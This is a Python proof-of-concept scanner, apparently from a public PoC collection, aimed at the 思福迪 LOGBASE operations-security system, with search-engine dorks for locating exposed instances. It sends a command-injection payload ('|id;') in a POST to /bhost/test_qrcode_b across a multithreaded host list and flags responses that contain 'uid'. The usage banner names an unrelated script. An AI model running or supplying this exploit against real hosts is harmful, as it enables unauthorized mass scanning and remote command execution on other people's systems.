#!/usr/bin/python3
# -*- coding:utf-8 -*-
# author:MDSEC
# from:https://github.com/MD-SEC/MDPOCS
# fofa: product="思福迪-LOGBASE"
# hunter: web.body="思福迪-LOGBASE"
# zoomeye: app:"思福迪运维安全管理系统"

import sys
import requests
import csv
import urllib3
import hashlib
from concurrent.futures import ThreadPoolExecutor
urllib3.disable_warnings()

if len(sys.argv) != 2:
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    print(
        '+ DES: by MDSEC as https://github.com/MD-SEC/MDPOCS                                                        +')
    print(
        '+---------------------------------------------------------------------------------------------------------+')
    print(
        '+ USE: python3 <filename> <hosts.txt>                                                                      +')
    print(
        '+ EXP: python3 Qiwangzhizao_ERP_Comboxstore_Rce_Poc.py url.txt                                             +')
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    sys.exit()
proxysdata = {
'http': '127.0.0.1:8080'
} 
def poc(host):
    if "http" in host:
        url = host
    else:
        url ="http://"+host
    host1=url.replace("http://","")
    host2=host1.replace("https://","")
    headers = {
        "User-Agent": "Go-http-client/1.1",
        "Accept":"gzip",
        "Referer":"%s" % host,
        "Content-Type": "application/x-www-form-urlencoded",
        "Host":"%s" % host2
    }
    vulurl = url + "/bhost/test_qrcode_b"
    data='z1=1&z2="|id;"&z3=bhost'
    try:
        r = requests.post(vulurl, headers=headers,data=data,verify=False)
        #print(r.status_code)
        if r.status_code==200 and "uid" in r.text :
            print(host+" :true ")
        else:
            return 0
            print (host+":false")
    except:
        return 0
        print (host+":false")

if __name__ == '__main__':
    file = sys.argv[1]
    data = open(file)
    reader = csv.reader(data)
    with ThreadPoolExecutor(50) as pool:
        for row in reader:
            pool.submit(poc, row[0])